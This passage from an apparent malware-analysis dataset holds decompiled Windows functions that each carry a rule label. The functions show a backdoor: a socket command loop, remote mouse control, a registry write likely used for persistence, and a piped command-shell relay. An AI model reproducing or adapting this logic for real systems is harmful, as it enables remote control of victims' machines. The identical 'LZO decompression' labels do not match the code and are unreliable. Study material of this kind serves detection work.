        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00481218 noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack1076 = &stack0xfffffffc;\n    var_420h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack1080 = 0x48137a;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1084;\n    fcn.00405728();\n    fcn.00405b28(&var_420h);\n    fcn.00405a44();\n    uVar1 = fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    uVar2 = fcn.00409ecc();\n    fcn.0048113c();\n    iVar3 = sub.wsock32.dll_socket(2, 2, 0);\n    if (iVar3 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.00403af4();\n    var_1ch._0_2_ = 2;\n    var_18h = sub.wsock32.dll_inet_addr(uVar1);\n    var_1ch._2_2_ = sub.wsock32.dll_htons(uVar2);\n    if (var_18h == -1) {\n        iVar4 = sub.wsock32.dll_gethostbyname(uVar1);\n        if (iVar4 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_18h = ***(iVar4 + 0xc);\n    }\n    iVar4 = var_4h;\n    if (var_4h != 0) {\n        iVar4 = *(var_4h + -4);\n    }\n    sub.wsock32.dll_sendto(iVar3, &var_4h, iVar4, 0, &var_1ch, 0x10);\n    fcn.00405728();\n    sub.kernel32.dll_Sleep_1(1000);\n    sub.wsock32.dll_closesocket(iVar3);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 628
    },
    "00481528": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00481528(uint param_1, int32_t param_2)\n\n{\n    uint in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uint buf;\n    uint s;\n    int32_t var_4h;\n    \n    puStack1048 = 0x481541;\n    s = in_EAX;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack1052 = 0x4815ba;\n    uStack1056 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbe0;\n    puStack1048 = &stack0xfffffffc;\n    fcn.00403af4();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    if (-1 < iVar2 + -1) {\n        iVar3 = 0;\n        puVar1 = &fcn.00481528::buf;\n        do {\n            *puVar1 = *(var_4h + iVar3);\n            iVar3 = iVar3 + 1;\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    sub.wsock32.dll_send(s, &fcn.00481528::buf, 0x400, 0);\n    *in_FS_OFFSET = s;\n    fcn.00405530(0x4815c1);\n    return;\n}\n",
        "token_count": 376
    },
    "00482384": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00482384(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint phkResult;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack32 = 0x48239b;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack32 = 0x4823a3;\n    fcn.004059cc();\n    uStack36 = 0x48243e;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x482412;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack32 = &stack0xfffffffc;\n    sub.advapi32.dll_RegOpenKeyA(0x80000001, 0x48244c, &fcn.00482384::phkResult);\n    iVar2 = var_8h;\n    if (var_8h != 0) {\n        iVar2 = *(var_8h + -4);\n    }\n    uVar1 = fcn.004059dc(iVar2 + 1);\n    uVar3 = 0;\n    uVar1 = fcn.004059dc(0, 1, uVar1);\n    sub.advapi32.dll_RegSetValueExA(phkResult, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = phkResult;\n    *in_FS_OFFSET = uVar3;\n    fcn.00405554(0x482445);\n    return;\n}\n",
        "token_count": 436
    },
    "0048247c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048247c(void)\n\n{\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uchar uVar1;\n    int32_t in_stack_ffffffbc;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    puStack32 = 0x482493;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    uStack36 = 0x48258a;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x48255e;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack32 = &stack0xfffffffc;\n    fcn.00421688();\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421fe8();\n    uVar1 = var_8h == 0 || var_8h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar1) {\n        fcn.00405818();\n        var_4h = in_stack_ffffffbc;\n    }\n    else {\n        fcn.004058e0(var_4h, 0x4825f4, var_8h);\n    }\n    fcn.00421f88();\n    fcn.00404650();\n    *in_FS_OFFSET = var_4h;\n    *in_FS_OFFSET = &fcn.0048247c::var_ch;\n    uStack48 = 0x482591;\n    iStack52 = 0x482589;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 458
    },
    "00482fa8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00482fa8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack24 = 0x482fbb;\n    fcn.004059cc();\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    if (0 < iVar2) {\n        do {\n    // switch table (55 cases) at 0x483043\n            switch(*(in_EAX + -1 + iVar2)) {\n            case 0x30:\n                break;\n            case 0x31:\n                break;\n            case 0x32:\n                break;\n            case 0x33:\n                break;\n            case 0x34:\n                break;\n            case 0x35:\n                break;\n            case 0x36:\n                break;\n            case 0x37:\n                break;\n            case 0x38:\n                break;\n            case 0x39:\n                break;\n            case 0x41:\n                break;\n            case 0x42:\n                break;\n            case 0x43:\n                break;\n            case 0x44:\n                break;\n            case 0x45:\n                break;\n            case 0x46:\n                break;\n            case 0x61:\n                break;\n            case 0x62:\n                break;\n            case 99:\n                break;\n            case 100:\n                break;\n            case 0x65:\n                break;\n            case 0x66:\n            }\n            iVar1 = in_EAX;\n            if (in_EAX != 0) {\n                iVar1 = *(in_EAX + -4);\n            }\n            if (iVar1 != iVar2) {\n                iVar1 = in_EAX;\n                if (in_EAX != 0) {\n                    iVar1 = *(in_EAX + -4);\n                }\n                if (0 < iVar1) {\n                    do {\n                        iVar1 = iVar1 + -1;\n                    } while (iVar1 != 0);\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    uStack24 = 0x48319f;\n    uStack28 = 0x483197;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 585
    },
    "00483a60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00483a60(void)\n\n{\n    uint *in_EAX;\n    uint arg_8h;\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    uint32_t uVar2;\n    uint unaff_ESI;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_130h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_114h;\n    uint uStackY156;\n    uint uStackY152;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    iVar1 = 0x2b;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    puVar3 = &fcn.00483a60::var_138h;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    for (iVar1 = 0x4a; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *in_EAX;\n        in_EAX = in_EAX + 1;\n        puVar3 = puVar3 + 1;\n    }\n    uStack32 = 0x483c45;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.00405530();\n    for (uVar2 = 0; *(&fcn.00483a60::var_114h + (uVar2 & 0xff)) != '\\0'; uVar2 = uVar2 + 1) {\n        fcn.00405718();\n        fcn.00405818();\n    }\n    fcn.00483604();\n    fcn.00483694();\n    if (var_8h != 0) {\n        var_8h = *(var_8h + -4);\n    }\n    if (var_8h == 0) {\n        fcn.004055c8();\n    }\n    if (var_ch != 0) {\n        var_ch = *(var_ch + -4);\n    }\n    if (var_ch == 0) {\n        fcn.004055c8();\n    }\n    fcn.004839a8();\n    fcn.00409e4c(var_124h);\n    fcn.00409e4c(var_130h);\n    fcn.00409e4c(var_10h);\n    fcn.00409e4c(var_120h);\n    fcn.00483844();\n    arg_8h = sub.kernel32.dll_GetCurrentProcessId();\n    uStackY152 = 0x483c08;\n    fcn.00409e4c(arg_8h);\n    uStackY152 = var_158h;\n    uStackY156 = 0x483c1a;\n    fcn.004058e0();\n    *in_FS_OFFSET = uStackY152;\n    fcn.00405554();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 811
    },
    "00484c90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00484ea4)\n// WARNING: Removing unreachable block (ram,0x00484ead)\n\nvoid fcn.00484c90(void)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uchar auStack8216 [4020];\n    uint uStack4196;\n    uint uStack4192;\n    uchar *puStack4188;\n    int32_t iStack4184;\n    uchar *puStack4180;\n    uint name;\n    uint var_4h;\n    \n    puStack4180 = &stack0xfffffffc;\n    iVar3 = 2;\n    do {\n        iVar2 = iVar3;\n        iVar3 = iVar2 + -1;\n    } while (iVar3 != 0);\n    iStack4184 = 0x484f1e;\n    puStack4188 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefa4;\n    iVar3 = 0;\ncode_r0x00484cdb:\n    do {\n        uStack4192 = 0x484ce7;\n        iVar4 = (**(***0x4922c4 + 0x14))();\n        if (iVar4 + -1 < iVar3) {\n            iVar3 = 0;\n        }\n        fcn.004650d4();\n        iVar4 = fcn.004059dc();\n        **0x4925e8 = iVar4;\n        uVar1 = fcn.00464ff8();\n        **0x49248c = uVar1;\n        iVar3 = iVar3 + 1;\n        sub.kernel32.dll_Sleep_1();\n        while (iVar4 = sub.user32.dll_PeekMessageA(),  iVar4 != 0) {\n            sub.user32.dll_TranslateMessage();\n            sub.user32.dll_DispatchMessageA();\n        }\n        fcn.00403af4();\n        puStack4188 = 0x2;\n        iVar4 = sub.wsock32.dll_socket();\n        **0x4925a8 = iVar4;\n    } while (**0x4925a8 == -1);\n    sub.wsock32.dll_htons();\n    iVar4 = sub.wsock32.dll_inet_addr();\n    if (iVar4 == -1) goto code_r0x00484dc6;\n    goto code_r0x00484de5;\ncode_r0x00484dc6:\n    puStack4188 = **0x4925e8;\n    iVar4 = sub.wsock32.dll_gethostbyname();\n    if (iVar4 != 0) {\ncode_r0x00484de5:\n        iVar4 = **0x4925a8;\n        puStack4180 = 0x484df8;\n        iVar5 = sub.wsock32.dll_connect();\n        if (iVar5 == 0) {\n            **0x49252c = 1;\n            while (*(iVar2 + 0xd) == '\\0') {\n                puStack4180 = 0x484e1f;\n                fcn.00403af4();\n                puStack4180 = NULL;\n                iStack4184 = 0x2000;\n                puStack4188 = &stack0xffffdfe8;\n                iVar4 = **0x4925a8;\n                uStack4196 = 0x484e3a;\n                iVar3 = sub.wsock32.dll_recv();\n                if (iVar3 < 1) {\n                    uStack4196 = 0x484e47;\n                    fcn.00484bd8();\n                }\n                else {\n                    uStack4196 = 0x484e5a;\n                    fcn.00405e3c();\n                    uStack4196 = 0x484e6b;\n                    fcn.00409bc0();\n                    uStack4196 = 0x484e79;\n                    fcn.004057d4();\n                    uStack4196 = 0x484e8f;\n                    fcn.00461610();\n                    uStack4196 = 0x484e9d;\n                    fcn.004055c8();\n                }\n            }\n            *in_FS_OFFSET = iVar4;\n            fcn.00405530();\n            fcn.00405d40();\n            fcn.00405530();\n            fcn.00405530();\n            return;\n        }\n        puStack4180 = 0x1;\n        iStack4184 = **0x4925a8;\n        puStack4188 = 0x484ed0;\n        sub.wsock32.dll_shutdown();\n        puStack4188 = **0x4925a8;\n        uStack4192 = 0x484edd;\n        sub.wsock32.dll_closesocket();\n    }\n    goto code_r0x00484cdb;\n}\n",
        "token_count": 1056
    },
    "00486b64": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00486b64(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack8264;\n    uint uStack8260;\n    uint uStack8256;\n    uint uStack8252;\n    uint uStack8248;\n    uint uStack8244;\n    uint uStack8240;\n    ushort uStack8236;\n    ushort uStack8234;\n    int32_t iStack8232;\n    uint auStack8220 [986];\n    uint uStack4276;\n    uint uStack4272;\n    uint *puStack4268;\n    uint *puStack4264;\n    uint *puStack4260;\n    uint *puStack4256;\n    uint *puStack4252;\n    uchar *puStack4248;\n    int32_t iStack4244;\n    uchar *puStack4240;\n    uchar *puStack4236;\n    uint uStack4232;\n    uchar *puStack4228;\n    uchar *puStack4224;\n    uint uStack4220;\n    uint uStack4216;\n    uint uStack4212;\n    uint32_t uStack4208;\n    uint uStack4204;\n    uint uStack4200;\n    uint uStack4196;\n    int32_t iStack4192;\n    uint uStack4188;\n    uchar *puStack4184;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4184 = &stack0xfffffffc;\n    iVar2 = 2;\n    do {\n        iVar1 = iVar2;\n        iVar2 = iVar1 + -1;\n    } while (iVar1 + -1 != 0);\n    uStack8264 = 0;\n    uStack8260 = 0;\n    uStack8256 = 0;\n    uStack8252 = 0;\n    uStack8248 = 0;\n    uStack8240 = 0;\n    uStack8244 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    uStack4188 = 0x486f8b;\n    iStack4192 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefa0;\n    uStack4196 = 0;\n    uStack4200 = 1;\n    uStack4204 = 2;\n    uStack4208 = 0x486bce;\n    iVar2 = sub.wsock32.dll_socket();\n    *(iVar1 + 0x44) = iVar2;\n    if (iVar2 != -1) {\n        uStack8236 = 2;\n        uStack4208 = **0x49248c;\n        uStack4212 = 0x486bf4;\n        uStack8234 = sub.wsock32.dll_htons();\n        uStack4212 = **0x4925e8;\n        uStack4216 = 0x486c08;\n        iStack8232 = sub.wsock32.dll_inet_addr();\n        if (iStack8232 == -1) {\n            uStack4216 = **0x4925e8;\n            uStack4220 = 0x486c20;\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            if (iVar2 == 0) goto code_r0x00486f46;\n            iStack8232 = ***(iVar2 + 0xc);\n        }\n        uStack4220 = 0x10;\n        puStack4224 = &stack0xffffdfd4;\n        puStack4228 = *(iVar1 + 0x44);\n        uStack4232 = 0x486c4a;\n        sub.wsock32.dll_connect();\n        uStack4232 = 0;\n        puStack4236 = 0x2000;\n        puStack4240 = &stack0xffffdfe4;\n        uStack4216 = *(iVar1 + 0x44);\n        puStack4248 = 0x486c64;\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            puStack4248 = 0x486c7c;\n            fcn.00409d60();\n            puStack4248 = 0x486c92;\n            fcn.00405864();\n            puStack4248 = 0x486ca3;\n            fcn.00474dbc();\n            puStack4248 = NULL;\n            puStack4252 = 0x2000;\n            puStack4256 = &stack0xffffdfe4;\n            uStack4216 = *(iVar1 + 0x44);\n            puStack4264 = 0x486cbd;\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                while (*(iVar1 + 0xd) == '\\0') {\n                    uStack4220 = 0x486cd8;\n                    fcn.00403af4();\n                    uStack4220 = 0x486cea;\n                    fcn.00403af4();\n                    uStack4220 = 0;\n                    puStack4224 = 0x2000;\n                    puStack4228 = &stack0xffffdfe4;\n                    uStack4216 = *(iVar1 + 0x44);\n                    puStack4236 = 0x486d04;\n                    iVar2 = sub.wsock32.dll_recv();\n                    if (iVar2 < 1) break;\n                    uVar3 = 1;\n                    puStack4240 = 0x486f2f;\n                    iStack4244 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffef6c;\n                    puStack4248 = 0x486d2a;\n                    puStack4236 = &stack0xfffffffc;\n                    fcn.00405728();\n                    puStack4248 = &stack0xffffdfc8;\n                    puStack4252 = 0x486d43;\n                    fcn.00405a44();\n                    puStack4252 = 0x486d53;\n                    fcn.00405974();\n                    if (uVar3) {\n                        puStack4252 = &fcn.00486b64::var_8h;\n                        puStack4256 = 0x486d77;\n                        fcn.00405a44();\n                        puStack4256 = NULL;\n                        puStack4260 = 0x486d81;\n                        puStack4260 = fcn.00409ecc();\n                        puStack4264 = NULL;\n                        puStack4268 = NULL;\n                        uStack4272 = 0x800;\n                        uStack4276 = 0x486d90;\n                        sub.user32.dll_mouse_event();\n                    }\n                    else {\n                        puStack4252 = &stack0xffffdfc4;\n                        puStack4256 = 0x486dae;\n                        fcn.00405a44();\n                        puStack4256 = 0x486dbe;\n                        fcn.00405974();\n                        if (uVar3) {\n                            puStack4256 = &fcn.00486b64::var_8h;\n                            puStack4260 = 0x486de2;\n                            fcn.00405a44();\n                            puStack4260 = 0x486dea;\n                            fcn.00461ae8();\n                        }\n                        else {\n                            puStack4256 = &stack0xffffdfc0;\n                            puStack4260 = 0x486e08;\n                            fcn.00405a44();\n                            puStack4260 = 0x486e18;\n                            fcn.00405974();\n                            if (uVar3) {\n                                puStack4260 = &fcn.00486b64::var_8h;\n                                puStack4264 = 0x486e48;\n                                fcn.00405a44();\n                                puStack4264 = 0x486e52;\n                                fcn.004875c8();\n                            }\n                            else {\n                                puStack4260 = &stack0xffffdfbc;\n                                puStack4264 = 0x486e70;\n                                fcn.00405a44();\n                                puStack4264 = 0x486e80;\n                                fcn.00405974();\n                                if (uVar3) {\n                                    puStack4264 = &fcn.00486b64::var_8h;\n                                    puStack4268 = 0x486eb0;\n                                    fcn.00405a44();\n                                    puStack4268 = 0x486ebd;\n                                    fcn.004875c8();\n                                }\n                                else {\n                                    puStack4264 = &stack0xffffdfb8;\n                                    puStack4268 = 0x486ed8;\n                                    fcn.00405a44();\n                                    puStack4268 = 0x486ee8;\n                                    fcn.00405974();\n                                    if (uVar3) {\n                                        puStack4268 = &fcn.00486b64::var_8h;\n                                        uStack4272 = 0x486f18;\n                                        fcn.00405a44();\n                                        uStack4272 = 0x486f25;\n                                        fcn.004875c8();\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    *in_FS_OFFSET = puStack4268;\n                }\n            }\n        }\n    }\ncode_r0x00486f46:\n    uStack4220 = 2;\n    puStack4224 = *(iVar1 + 0x44);\n    puStack4228 = 0x486f54;\n    sub.wsock32.dll_shutdown();\n    puStack4228 = *(iVar1 + 0x44);\n    uStack4232 = 0x486f60;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = puStack4228;\n    uStack4220 = 0x486f92;\n    puStack4224 = 0x486f7d;\n    fcn.00405554();\n    puStack4224 = 0x486f8a;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2198
    },
    "00487bc8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00487bc8(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack18844;\n    uint auStack18840 [7];\n    uchar auStack18812 [9216];\n    uchar auStack9596 [2872];\n    uint uStack6724;\n    uchar *puStack6720;\n    uchar *puStack6716;\n    uchar *puStack6708;\n    uint uStack6704;\n    uint *puStack6700;\n    uint uStack6696;\n    uint uStack6692;\n    uint uStack6688;\n    uint uStack6684;\n    uchar *puStack6680;\n    uint *puStack6676;\n    uint uStack6672;\n    uchar *puStack6668;\n    uint *puStack6664;\n    uint *puStack6660;\n    uint *puStack6656;\n    uint uStack6652;\n    uint uStack6648;\n    uint uStack6644;\n    uchar *puStack6640;\n    uint *puStack6636;\n    uint *puStack6632;\n    uint uStack6628;\n    uint *puStack6624;\n    uint uStack6620;\n    uint *puStack6616;\n    int32_t iStack6612;\n    uint *puStack6608;\n    uint uStack6604;\n    uint *puStack6600;\n    uint *puStack6596;\n    uint *puStack6592;\n    uint uStack6588;\n    uint uStack6584;\n    uint uStack6580;\n    uchar *puStack6576;\n    uint var_178h;\n    uchar *var_74h;\n    uint var_70h;\n    uint var_64h;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack6576 = &stack0xfffffffc;\n    iVar3 = 4;\n    do {\n        iVar2 = iVar3;\n        iVar3 = iVar2 + -1;\n    } while (iVar2 + -1 != 0);\n    uStack18844 = 0;\n    var_4h = 0;\n    uStack6580 = 0x487e96;\n    uStack6584 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffe648;\n    *(iVar2 + 0x48) = 0;\n    uStack6588 = 0x487c16;\n    puStack6660 = fcn.00402f00();\n    *puStack6660 = 0xc;\n    puStack6660[2] = 0xffffffff;\n    puStack6660[1] = 0;\n    uStack6588 = 0;\n    puStack6596 = &fcn.00487bc8::var_ch;\n    puStack6600 = &fcn.00487bc8::var_8h;\n    uStack6604 = 0x487c3a;\n    puStack6592 = puStack6660;\n    sub.kernel32.dll_CreatePipe();\n    uStack6604 = 0;\n    iStack6612 = iVar2 + 0x40;\n    puStack6616 = &fcn.00487bc8::var_10h;\n    uStack6620 = 0x487c4a;\n    puStack6608 = puStack6660;\n    sub.kernel32.dll_CreatePipe();\n    uStack6620 = 0x104;\n    puStack6624 = &fcn.00487bc8::var_178h;\n    uStack6628 = 0x487ea4;\n    puStack6632 = 0x487c60;\n    sub.kernel32.dll_GetEnvironmentVariableA();\n    puStack6632 = 0x487c6f;\n    fcn.00403af4();\n    var_64h = 0x44;\n    var_38h = 0x101;\n    var_34h._0_2_ = 0;\n    var_2ch = var_10h;\n    var_28h = var_ch;\n    var_24h = var_ch;\n    puStack6632 = &fcn.00487bc8::var_74h;\n    puStack6636 = &fcn.00487bc8::var_64h;\n    puStack6640 = NULL;\n    uStack6644 = 0;\n    uStack6648 = 0;\n    uStack6652 = 0xffffffff;\n    puStack6664 = &fcn.00487bc8::var_178h;\n    puStack6668 = NULL;\n    uStack6672 = 0x487cb5;\n    puStack6656 = puStack6660;\n    iVar3 = sub.kernel32.dll_CreateProcessA();\n    if (iVar3 != 0) {\n        while (*(iVar2 + 0xd) == '\\0') {\n            puStack6640 = 0x7d0;\n            puStack6676 = 0x487cd2;\n            sub.kernel32.dll_Sleep_1();\n            while( true ) {\n                uStack6644 = 1;\n                uStack6648 = 0;\n                uStack6652 = 0;\n                puStack6656 = NULL;\n                puStack6660 = &stack0xffffb668;\n                puStack6664 = 0x487d00;\n                iVar3 = sub.user32.dll_PeekMessageA();\n                if (iVar3 == 0) break;\n                puStack6664 = &stack0xffffb668;\n                puStack6668 = 0x487ce0;\n                sub.user32.dll_TranslateMessage();\n                puStack6640 = &stack0xffffb668;\n                uStack6672 = 0x487cec;\n                sub.user32.dll_DispatchMessageA();\n            }\n            *(iVar2 + 0x48) = 1;\n            puStack6664 = &fcn.00487bc8::var_18h;\n            puStack6668 = var_74h;\n            uStack6672 = 0x487d15;\n            sub.kernel32.dll_GetExitCodeProcess();\n            if (var_18h != 0x103) break;\n            uStack6672 = 0x487d2a;\n            fcn.00405530();\n            uStack6672 = 0;\n            puStack6676 = &fcn.00487bc8::var_14h;\n            puStack6680 = NULL;\n            uStack6684 = 0;\n            uStack6688 = 0;\n            uStack6692 = var_8h;\n            uStack6696 = 0x487d3f;\n            sub.kernel32.dll_PeekNamedPipe();\n            uVar1 = uStack6692;\n            uStack6692 = var_8h;\n            while (var_8h = uStack6692,  var_14h != 0) {\n                uStack6696 = 0;\n                puStack6700 = &fcn.00487bc8::var_14h;\n                uStack6704 = 0x2400;\n                puStack6708 = &stack0xffffda84;\n                puStack6716 = 0x487d64;\n                iVar3 = sub.kernel32.dll_ReadFile_1();\n                uVar1 = uStack6692;\n                if (iVar3 == 0) break;\n                puStack6716 = &stack0xffffb684;\n                puStack6720 = &stack0xffffda84;\n                uStack6724 = 0x487d7b;\n                func_0x00408370();\n                puStack6668 = &stack0xffffb664;\n                uStack6672 = 0x487d98;\n                fcn.004057a0();\n                uStack6672 = 0x487dab;\n                fcn.00405a44();\n                uStack6672 = 0x487db9;\n                fcn.00405818();\n                uStack6672 = 0;\n                puStack6676 = &fcn.00487bc8::var_14h;\n                puStack6680 = NULL;\n                uStack6684 = 0;\n                uStack6688 = 0;\n                uStack6692 = var_8h;\n                uStack6696 = 0x487dce;\n                sub.kernel32.dll_PeekNamedPipe();\n                uVar1 = uStack6692;\n                uStack6692 = var_8h;\n            }\n            uStack6692 = uVar1;\n            var_20h = var_4h;\n            if (var_4h != 0) {\n                var_20h = *(var_4h + -4);\n            }\n            if (0 < var_20h) {\n                uStack6696 = 0x487e03;\n                iVar3 = fcn.0041f9b4();\n                *(iVar3 + 0xf) = 1;\n                uStack6696 = 0x487e12;\n                fcn.0041fbc0();\n                uStack6696 = 0x487e1c;\n                fcn.00487b08();\n                uStack6696 = 0x487e26;\n                fcn.00487ab8();\n                uStack6696 = 0x487e30;\n                fcn.00487b04();\n                uStack6696 = 0x487e37;\n                fcn.0041fe70();\n                uStack6696 = 0x487e3e;\n                fcn.0041fea0();\n            }\n        }\n    }\n    *(iVar2 + 0x48) = 0;\n    uStack6672 = 0;\n    puStack6676 = var_74h;\n    puStack6680 = 0x487e57;\n    sub.kernel32.dll_TerminateProcess();\n    puStack6680 = var_74h;\n    uStack6684 = 0x487e60;\n    sub.kernel32.dll_CloseHandle_1();\n    uStack6684 = var_70h;\n    uStack6688 = 0x487e69;\n    sub.kernel32.dll_CloseHandle_1();\n    uStack6688 = 0x487e70;\n    fcn.00402f1c();\n    *in_FS_OFFSET = uStack6684;\n    puStack6676 = 0x487e9d;\n    puStack6680 = 0x487e8d;\n    fcn.00405554();\n    puStack6680 = 0x487e95;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 2378
    },
    "00487eac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
